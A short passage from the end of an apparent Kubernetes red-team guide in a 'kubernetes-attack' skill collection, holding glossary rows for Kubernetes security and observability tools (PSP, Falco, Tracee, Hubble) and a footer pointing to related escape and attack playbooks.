| **PSP** | PodSecurityPolicy — deprecated, removed in 1.25 |
| **Falco** | CNCF runtime-detection tool — syscall-based rules |
| **Tracee** | Aqua Security eBPF observability — deeper syscall visibility than Falco |
| **Hubble** | Cilium's network observability layer |

---

*This guide is maintained as part of the kali-claw `kubernetes-attack` skill. Updates are tracked via `skills/kubernetes-attack/SKILL.md` metadata version. For the basic pod-escape playbook, see `guides/k8s-escape-and-lateral-movement-playbook.md`. For the end-to-end K8s red team workflow, see `guides/kubernetes-attack-playbook.md`.*
